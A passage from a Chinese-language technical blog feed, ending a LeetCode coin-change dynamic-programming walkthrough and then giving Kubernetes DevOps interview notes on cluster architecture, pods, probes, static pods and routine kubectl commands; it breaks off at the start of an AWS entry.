<code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>1</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>外層迴圈: <code>i = 3</code></p><ul><li>嘗試硬幣 <code>1</code>：<ul><li><code>dp[3] = min(dp[3], dp[3 - 1] + 1) = min(∞, 1 + 1) = 2</code></li></ul></li><li>嘗試硬幣 <code>2</code>：<ul><li><code>dp[3]</code> 不變（因為 <code>dp[1] = 1 + 1 = 2</code>）</li></ul></li></ul><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>1</td><td>2</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>外層迴圈: <code>i = 4</code></p><ul><li>嘗試硬幣 <code>1</code>：<ul><li><code>dp[4] = min(dp[4], dp[4 - 1] + 1) = min(∞, 2 + 1) = 3</code></li></ul></li><li>嘗試硬幣 <code>2</code>：<ul><li><code>dp[4] = min(dp[4], dp[4 - 2] + 1) = min(3, 1 + 1) = 2</code></li></ul></li></ul><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>1</td><td>2</td><td>2</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>外層迴圈: <code>i = 5</code></p><ul><li>嘗試硬幣 <code>1</code>：<ul><li><code>dp[5] = min(dp[5], dp[5 - 1] + 1) = min(∞, 2 + 1) = 3</code></li></ul></li><li>嘗試硬幣 <code>2</code>：<ul><li><code>dp[5] = min(dp[5], dp[5 - 2] + 1) = min(3, 2 + 1) = 3</code></li></ul></li><li>嘗試硬幣 <code>5</code>：<ul><li><code>dp[5] = min(dp[5], dp[5 - 5] + 1) = min(3, 0 + 1) = 1</code></li></ul></li></ul><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>1</td><td>2</td><td>2</td><td>1</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>重複步驟直到 <code>i = 11</code></p><p>最終結果</p><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>1</td><td>2</td><td>2</td><td>1</td><td>2</td><td>2</td><td>3</td><td>3</td><td>2</td><td>3</td></tr></tbody></table><p>結果 <code>dp[11] = 3</code> 表示湊成金額 <code>11</code> 需要最少 <code>3</code> 個硬幣。</p></div></details><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/322/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p><code>dp[amount]</code> 儲存了從 <code>0</code> 到 <code>amount</code> 的所有子問題結果，所以會有 <code>amount+1</code> 個子問題。每個子問題的計算時間，在 <code>coinchangehelper</code> 中，我們對每個 <code>amount</code> 值都會遍歷一次 <code>coins</code> 陣列，並對每個硬幣遞迴呼叫一次。所以每次計算時間會是 $O(n)$，其中 $n$ 為 <code>coins</code> 長度。</p><p>因此整體時間複雜度會是 $O(amount \times n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li><code>dp</code> 儲存空間大小取決於 <code>amount</code> 長度，因此為 $O(amount)$</li><li>Recursive Call 深度，最慘會是 <code>amount</code></li></ul><p>因此整體空間複雜度會是 $O(amount)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes for DevOps 筆記 |【DevOps技能樹】</title>
      <link href="/posts/c7f5f41c.html"/>
      <url>/posts/c7f5f41c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p><em><strong>解釋一下什麼是 Kubernetes</strong></em></p><p>用於進行 <strong>容器編排和管理</strong>的平台，可用於容器的自動化部署和擴展</p><p><em>Kubernetes 的主要功能有哪些?</em></p><ul><li>Self-Healing: 使用 Health check 來檢查運行中的容器，並且做出對應行為 Ex.重啟容器</li><li>Load Balancing: 將請求分散給 cluster中不同的應用</li><li>Operations: Kubernetes 打包的應用程式可以使用Cluster的 API 來更新其狀態並根據 Event 和應用程式狀態變更觸發操作</li><li>Automated Rollout: 逐步對應用更新，並且在出現問題時可以Rollout</li><li>Scaling: 基於自定義的條件進行水平擴展</li><li>Secrets：可用一種以私有方式儲存使用者名稱、密碼和服務端點的機制，而且並非每個使用Cluster的使用者都可以查看</li></ul><p><em><strong>可以用哪些方式來去跟 Kubernetes 的資源互動</strong></em></p><p>可以用 kubectl 命令列工具去與 Kubernetes Cluster 進行互動。</p><p><em><strong>在部署應用到 Kubernetes的時候，哪些 Kubernetes 物件最常使用到</strong></em></p><ul><li>Deployment: 建立一群Pods 並監控</li><li>Service: 在叢集內部將流量路由到 Pod 中</li><li>Ingress: 將外部將流量路由到叢集</li></ul><p><em><strong>Kubernetes 有哪些常見的 Objects?</strong></em></p><p>Pod, Service, ReplicationController, ReplicatSet, DaemonSet, Namespace, ConfigMap…etc</p><blockquote><p>Container 並非 Kubernetes 物件，Kubernetes中最小的物件單元會是 Pod，而Pod中通常可以有一個或多個容器</p></blockquote><h1 id="Cluster-and-Architecture"><a href="#Cluster-and-Architecture" class="headerlink" title="Cluster and Architecture"></a>Cluster and Architecture</h1><p><img src="/img/devops/k8s/cluster.jpeg"></p><p><em><strong>什麼是 Kubernetes Cluster?</strong></em></p><p>為一群跑著容器化應用的節點(Nodes)集合，主要分成主節點(Master Node) 以及工作節點(Worker Node)</p><p>Master Node 為 Kubernetes 的控制中心，包含多個關鍵元件：</p><ul><li><strong>API Server</strong>: Kubernetes的API入口，負責接收API請求，像是部署應用、擴展容器等。反正所有對資源的操作情球都會經過API Server</li><li><strong>Scheduler</strong>: 負責將新的 Pod 調度到適合的工作節點，主要依據資源需求以及策略選擇</li><li><strong>Controller Manager</strong>: 負責管理不同的 Controller，這些控制器會負責維護 cluster 的期望狀態 Ex. 確保指定數量的Pod一直都運行中</li><li><strong>etcd</strong>： Kubernetes中的分散式資料庫，保存了整個 cluster 的狀態和設定</li></ul><p>Worker Node 會是在 kubernetes 中負責跑應用的節點，主要會負責跑下面這些元件：</p><ul><li><strong>kubelet</strong>: 負責管理節點上的 Pod 和容器，並且會監控容器狀態。 會透過 API Server 與主節點互動</li><li><strong>kube-proxy</strong>: 負責節點的網路設定，確保cluster內的每個Pod之間可以相互通訊，也負責 load balacing 功能。</li><li><strong>container runtime</strong>: 容器運行時(Docker, containerd) 會負責拉取 image 並運行容器。</li></ul><p><em><strong>我要如何確定當前的 Kubernetes 環境會是 Master Node 還是 Worker Node?</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes -o wide</span><br></pre></td></tr></table></figure><p>可能會輸出以下資訊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NAME        STATUS   ROLES           AGE   VERSION</span><br><span class="line">master-1    Ready    control-plane   20d   v1.20.0</span><br><span class="line">worker-1    Ready    &lt;none&gt;          20d   v1.20.0</span><br><span class="line">worker-2    Ready    &lt;none&gt;          20d   v1.20.0</span><br></pre></td></tr></table></figure><p><em><strong>要如何管理多個 Kubernetes clusters? 要如何透過 kubectl 快速切換不同 clusters</strong></em></p><p><code>kubectl config use-context [CONTEXT_NAME]</code></p><p>每個 Cluster 中會有一個 Context，可以透過命令查看所有可用的 Context</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl config get-contexts</span><br></pre></td></tr></table></figure><p><em><strong>要如何避免高記憶體用量，導致 Kubernetes cluster 發生 memory leak 或者 OOM(Out Of Memory)?</strong></em></p><p>方法一<br>可以為Pod 或容器設定 <strong>resource requests</strong> 和 <strong>resource limits</strong> 可以確保容器不會超出允許的資源使用範圍，讓應用在資源消耗過大的時候就停止，防止節點OOM。</p><p>透過 resource requests 可以確保Pod 所需要的最小資源要求，這點就會讓 Scheduler 在<br>調度節點的時候找到適合的節點安排Pod。相反， resource limits 限制了 Pod 可以用的最大資源量</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;256Mi&quot;</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;500m&quot;</span></span><br><span class="line">    <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;512Mi&quot;</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;1000m&quot;</span></span><br></pre></td></tr></table></figure><p>方法二<br>透過其他監控工具，Ex. Promethus, Grafana 監控 Pod 的記憶體使用</p><p>方法三<br>啟用 <strong>HPA(Horizontal Pod Autoscaler)</strong> ，可根據CPU 或Memory用量來自動增加或減少副本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl autoscale deployment [deployment_name] --cpu-percent=80 --min=2 --max=10</span><br></pre></td></tr></table></figure><p><em><strong>如何列出所有 API 物件種類</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl api-resources</span><br></pre></td></tr></table></figure><h2 id="Kubelet"><a href="#Kubelet" class="headerlink" title="Kubelet"></a>Kubelet</h2><p><em><strong>如果你將 worker node 上的 kubelet 停用，那正在運作的Pod 會發生什麼事？</strong></em></p><p>由於 Kubelet 負責與 API Server 溝通，若停用就代表 Worker Node 會無法與 API Server 互動，這時 Worker Node的狀態會被標注成 <strong>Not Ready</strong>，而上面跑的Pod 狀態會變成 <strong>Unknown</strong>，一旦control plane 檢測到 worker node 處於 Not Ready 太久(達到閥值時間，通常會是5分鐘)，則會驅逐在 worker node 上的pod，並且會去將Pod 重新 schedule 到其他可用的節點上</p><h1 id="Pods"><a href="#Pods" class="headerlink" title="Pods"></a>Pods</h1><p>Pods 會是 Kubernetes 中的最小物件單元，通常由一個或多個容器組成，在 Pod 中會共享網路資源, Storage 以及用於定義容器運行的 specification</p><p><img src="/img/devops/k8s/pod.png"></p><p><em><strong>如何部署一個使用 nginx:alpine 的image 並且叫做 my-pod  的 pod?</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run my-pod --image=nginx:alpine</span><br></pre></td></tr></table></figure><p>這通常並不是常見用來運行 Pod 的方法，通常會透過 Deployment 去跑 Pod</p><p><em><strong>通常 Pod 中會有多少個 Containers?</strong></em></p><p>Pod 可以包含多個 Container，但大多情況下會是一個。另外也可以部署 sidecar container 到 pod 當中，通常是為了蒐集Log</p><p><em><strong>Pod 可能會有哪些phase? 請簡要說明 Pod 的 LifeCycle</strong></em></p><p>Pod 在的生命週期中可能會出現以下的階段</p><table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody><tr><td>Pending</td><td>Pod 已被 Cluster 接受，但是當中的 container 可能還沒運行，這個階段中可能會從等待被 schedule或者是等待下載 container image</td></tr><tr><td>Running</td><td>所有容器都被建立，並且至少有一個容器運行中</td></tr><tr><td>Succeeded</td><td>所有Pod中容器都成功執行完畢，但並未重啟</td></tr><tr><td>Failed</td><td>所有Pod中容器都被終止，並且至少有一個容器是由於失敗而被終止，並且沒有 restart</td></tr><tr><td>Unkown</td><td>由於某種原因無法獲取 Pod 的狀態，通常是由於與Pod 與節點之間的通訊錯誤所導致的</td></tr></tbody></table><p><em><strong>當你透過 Kubectl 運行 Pod 會發生什麼是？請講解一下流程</strong></em></p><ol><li>Kubectl 會將請求發送給 API Server 去建立Pod<ul><li>API Server 會去驗證請求</li><li>etcd 會被更新</li></ul></li><li>Control Plane 中的 Scheduler 會去透過監控API Server來去知道目前有個 unassigned Pod</li><li>Scheduler 會去選擇一個node來去assign pod<ul><li>etcd 會被更新這個資訊</li></ul></li><li>Scheduler 會去告訴 API Server 他選的 Pod是哪個</li><li>Kubelet 注意到有Pod被 assigned 到他的節點，但是Pod並未運行</li><li>Kubelet 會去發送請求給 container engine (ex. Docker) 來去建立跟運行容器</li><li>當 Pod running 後 kubelet 會去將狀態更新給 API Server</li></ol><ul><li>etcd 會再度被 API Server 通知，以更新資訊</li></ul><blockquote><p>Ref: <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/">https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/</a></p></blockquote><p><em><strong>要怎麼知道pod中容器是有在運行的？</strong></em></p><p><code>kubectl describe pod &lt;POD_NAME&gt;</code> 去檢查 container 狀態是否是 <code>Running</code></p><p>或者是可以用 <code>kubectl exec </code> 執行命令到容器內</p><p><em><strong>當你發現 Pod 狀態是 CrashLoopBackOff，請問可能的錯誤會是什麼？ 要怎麼檢查錯誤？</strong></em></p><p>這通常代表 Pod 反覆啟動然後崩潰，啟動、崩潰。而通常有很多種不同的錯誤原因，像是：</p><ul><li>應用程式錯誤，導致容器必須退出</li><li>設定錯誤，像是錯誤的環境變數、遺失設定檔等等</li><li>資源限制，容器並沒有足夠的記憶體或是 CPU 分配給容器</li><li>Health Check 失敗，若應用沒有在預期時間內運行也會發生錯誤</li><li>Container liveness probes&#x2F; startup probe 回傳錯誤</li></ul><p>這種時候若要詳細的 Troubleshooting 則需要透過 <code>kubectl describe pod &lt;POD_NAME&gt;</code> 查看詳細原因 或者透過 <code>kubectl logs &lt;POD_NAME&gt;</code> 來去看 Pod 中容器內的日誌</p><p><img src="/img/devops/k8s/container.png"></p><p><em><strong>下方的 config 代表什麼?</strong></em></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">livenessProbe:</span></span><br><span class="line">  <span class="attr">exec:</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/appStatus</span></span><br><span class="line">  <span class="attr">initialDelaySeconds:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><p>這裡要先提到什麼是 <strong>liveness Probe</strong> 他的用途是當容器並未達到想要的狀態時，會去重啟容器。</p><p>在這行 YAML 中代表的是， <strong>如果 <code>cat /appStatus</code> 這個指令失敗，Kubernetes 會砍掉容器接著會採取重啟策略。</strong>  <code>initialDelaySeconds</code> 代表 Kubelet 會在初次執行 probe command （<code>cat /appStatus</code>）之前先等待 10秒，從此刻起，他每５秒就會重新執行一次 (定義在 <code>periodSeconds</code>中)</p><p><em><strong>下方的 config 代表什麼?</strong></em></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">readinessProbe:</span></span><br><span class="line">      <span class="attr">tcpSocket:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">2017</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p><strong>Readiness probe</strong> 通常決定了一個 container 是否 Ready 可以接受流量。所以這裡定義的是，若 Pod 尚未能夠連接到容器的port 2017前，都不會被標註 <code>Ready</code>，第一次的 Probe 會在容器運行後得 15後進行，並且每隔 20秒會持續進行檢查直到能夠連接到定義的port為止。</p><p><em><strong>刪除 Pod 會發生什麼事情?</strong></em></p><ol><li>Kubernetes 會向 Pod 中容器發送一個 SIGTERM 訊號，用來終止容器中的主要Process</li><li>這時容器會有一段時間來完成當前任務並釋放資源 (這個時間可以被定義在 <code>terminationGracePeriodSeconds</code> 中)，若沒有在時間內關閉，則會發送 SIGKILL 訊號強制終止</li></ol><p><em><strong>為何通常一個 Pod 只會有一個容器？</strong></em></p><p>如果每個 Pod 只有一個容器，Kubernetes 可以簡單地調整 Pod 的數量來增減服務的處理能力。而多容器的 Pod 在擴展上會更困難，因為必須同時複製多個容器</p><h2 id="Static-Pods"><a href="#Static-Pods" class="headerlink" title="Static Pods"></a>Static Pods</h2><blockquote><p>Ref</p><ol><li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/">https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/</a></li><li><a href="https://yuminlee2.medium.com/kubernetes-static-pods-734dc0684f31">https://yuminlee2.medium.com/kubernetes-static-pods-734dc0684f31</a></li></ol></blockquote><p><em><strong>什麼是 Static Pods ?</strong></em></p><p>由 Kubelet daemon 在節點上直接管理的一種Pod，而不是讓 Control Plane 管理。<strong>並且 Static Pod 通常直接定義在節點的指定目錄中。</strong> kubelet 會自動檢測該目錄中的配置文件並啟動相應的 Pod。</p><p>由於 Static Pod 由 kubelet 直接控制， <strong>因此沒辦法直接由 ReplicaSet 或者是 Deployment 進行副本管理</strong> ，也因此 Static Pod 只能在定義文件所在的 Node 上運行，並且不會自動調度到其他 Node 上</p><p><em><strong>可以講一下 Static Pod 的使用情境嗎？</strong></em></p><p>如果要跑 Control Plane 的控制元件，就會使用 Static Pod， <strong>通常在 Control Plane 中的控制元件，像是 API Server, kube-scheduler, etcd , kube-controller-manager 都會作為 Static Pod 存在於 Master Node 中</strong></p><p><em><strong>如何知道一個Pod是否是 Static Pod?</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe pod &lt;POD_NAME&gt; -n &lt;NAMESPACE&gt;</span><br></pre></td></tr></table></figure><p>檢查結果的 <code>annotations</code> 或者 <code>nodeName</code> 中有沒有有 “mirror pod” 註解。如果在 <code>metadata.annotations</code> 欄位中找到 <code>kubernetes.io/config.mirror</code>， <strong>這表示該 Pod 是一個由 Static Pod 所產生的 Mirror Pod。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">NAMESPACE     NAME                               READY   STATUS    RESTARTS        AGE</span><br><span class="line">default       web                                1/1     Running   0               5h14m</span><br><span class="line">kube-system   coredns-6f6b679f8f-s8l6l           1/1     Running   0               5h18m</span><br><span class="line">kube-system   etcd-minikube                      1/1     Running   0               5h18m</span><br><span class="line">kube-system   kube-apiserver-minikube            1/1     Running   0               5h18m</span><br><span class="line">kube-system   kube-controller-manager-minikube   1/1     Running   0               5h18m</span><br><span class="line">kube-system   kube-proxy-9c8vm                   1/1     Running   0               5h18m</span><br><span class="line">kube-system   kube-scheduler-minikube            1/1     Running   0               5h18m</span><br><span class="line">kube-system   storage-provisioner                1/1     Running   1 (5h18m ago)   5h18m</span><br><span class="line">~                                                                                                                                                 ○ minikube 04:28:02 下午</span><br><span class="line">❯ kdp etcd-minikube  -n kube-system</span><br></pre></td></tr></table></figure><p>輸出結果：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Name:</span>                 <span class="string">etcd-minikube</span></span><br><span class="line"><span class="attr">Namespace:</span>            <span class="string">kube-system</span></span><br><span class="line"><span class="attr">Priority:</span>             <span class="number">2000001000</span></span><br><span class="line"><span class="attr">Priority Class Name:</span>  <span class="string">system-node-critical</span></span><br><span class="line"><span class="attr">Node:</span>                 <span class="string">minikube/192.168.58.2</span></span><br><span class="line"><span class="attr">Start Time:</span>           <span class="string">Fri,</span> <span class="number">08</span> <span class="string">Nov</span> <span class="number">2024 11:09:17</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">Labels:</span>               <span class="string">component=etcd</span></span><br><span class="line">                      <span class="string">tier=control-plane</span></span><br><span class="line"><span class="attr">Annotations:          kubeadm.kubernetes.io/etcd.advertise-client-urls:</span> <span class="string">https://192.168.58.2:2379</span></span><br><span class="line">                      <span class="attr">kubernetes.io/config.hash:</span> <span class="string">0f576c7626af2d96b08f13e09b83eb08</span></span><br><span class="line">                      <span class="attr">kubernetes.io/config.mirror:</span> <span class="string">0f576c7626af2d96b08f13e09b83eb08</span></span><br><span class="line">                      <span class="attr">kubernetes.io/config.seen:</span> <span class="number">2024-11-08T03:09:16.930402512Z</span></span><br><span class="line">                      <span class="attr">kubernetes.io/config.source:</span> <span class="string">file</span></span><br><span class="line"><span class="attr">Status:</span>               <span class="string">Running</span></span><br><span class="line"><span class="attr">SeccompProfile:</span>       <span class="string">RuntimeDefault</span></span><br><span class="line"><span class="attr">IP:</span>                   <span class="number">192.168</span><span class="number">.58</span><span class="number">.2</span></span><br><span class="line"><span class="attr">IPs:</span></span><br><span class="line">  <span class="attr">IP:</span>           <span class="number">192.168</span><span class="number">.58</span><span class="number">.2</span></span><br><span class="line"><span class="attr">Controlled By:</span>  <span class="string">Node/minikube</span></span><br><span class="line"><span class="attr">Containers:</span></span><br><span class="line"><span class="string">.....</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以發現到確實有 mirror pod 的註解在</p><p><em><strong>Static Pod 的 manifest檔案通常在哪？</strong></em></p><p>通常會在 <code>/etc/kubernetes/manifests</code>，如果要刪除 static pod 也通常是直接刪除相關的 manifest 檔案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ minikube ssh</span><br><span class="line">docker@minikube:~$ ls /etc/kubernetes/manifests/</span><br><span class="line">etcd.yaml  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml</span><br><span class="line">docker@minikube:~$</span><br></pre></td></tr></table></figure><h2 id="Pods-Commands"><a href="#Pods-Commands" class="headerlink" title="Pods Commands"></a>Pods Commands</h2><p><em><strong>要如何確認一個 Pod 是被調度到哪個 Worker Node 上面？</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o wide</span><br></pre></td></tr></table></figure><p>刪除Pod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete pod &lt;POD_NAME&gt;</span><br></pre></td></tr></table></figure><p>列出所有 namespace 底下的所有 pod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --all-namespaces</span><br></pre></td></tr></table></figure><h2 id="Pods-Troubleshooting-and-Debugging"><a href="#Pods-Troubleshooting-and-Debugging" class="headerlink" title="Pods Troubleshooting and Debugging"></a>Pods Troubleshooting and Debugging</h2><p><em><strong>當你運行一個 Pod，但他都處在 Pending 狀態，可能會是什麼原因?</strong></em></p><p>有一種可能會是，負責調度 Pod 的 Scheduler 沒有在運行。可以透過 <code>kubectl get pod -A | grep scheduler</code> 來確認</p><p>***指令 <code>kubectl describe pod</code> 可以幹嘛？ ***</p><p>可以秀出Pod 的各種詳細資訊，有時候還會包含錯誤原因。</p><p><em><strong>建立一個使用 python image 的 static pod，並且要執行命令 sleep 20</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run some-pod --image=python --command sleep 20 --restart=Never --dry-run=client -o yaml &gt; statuc-pod.yaml</span><br></pre></td></tr></table></figure><h1 id="Labels-and-Selectors"><a href="#Labels-and-Selectors" class="headerlink" title="Labels and Selectors"></a>Labels and Selectors</h1><p><em><strong>什麼是 Label?</strong></em></p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h1 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h1><h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress"></a>Ingress</h1><h1 id="ReplicaSets"><a href="#ReplicaSets" class="headerlink" title="ReplicaSets"></a>ReplicaSets</h1><h1 id="DaemonSets"><a href="#DaemonSets" class="headerlink" title="DaemonSets"></a>DaemonSets</h1><h1 id="StatefulSet"><a href="#StatefulSet" class="headerlink" title="StatefulSet"></a>StatefulSet</h1><h1 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h1><h1 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h1><blockquote><p><a href="https://sean22492249.medium.com/networking-in-kubernetes-pod-%E8%88%87-pod-%E7%9A%84%E7%B6%B2%E8%B7%AF%E9%80%A3%E9%80%9A-216cfe6de471">https://sean22492249.medium.com/networking-in-kubernetes-pod-%E8%88%87-pod-%E7%9A%84%E7%B6%B2%E8%B7%AF%E9%80%A3%E9%80%9A-216cfe6de471</a></p></blockquote><h1 id="Policies"><a href="#Policies" class="headerlink" title="Policies"></a>Policies</h1><h1 id="Etcd"><a href="#Etcd" class="headerlink" title="Etcd"></a>Etcd</h1><h1 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h1><h1 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h1><h1 id="Secrets"><a href="#Secrets" class="headerlink" title="Secrets"></a>Secrets</h1><h1 id="Volumes"><a href="#Volumes" class="headerlink" title="Volumes"></a>Volumes</h1><h1 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h1><h1 id="CronJob"><a href="#CronJob" class="headerlink" title="CronJob"></a>CronJob</h1><h1 id="Helm"><a href="#Helm" class="headerlink" title="Helm"></a>Helm</h1><h1 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> DevOps </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS for DevOps 筆記 |【DevOps技能樹】</title>
      <link href="/posts/100cc6b6.html"/>
      <url>/posts/100cc6b6.html</url>
      
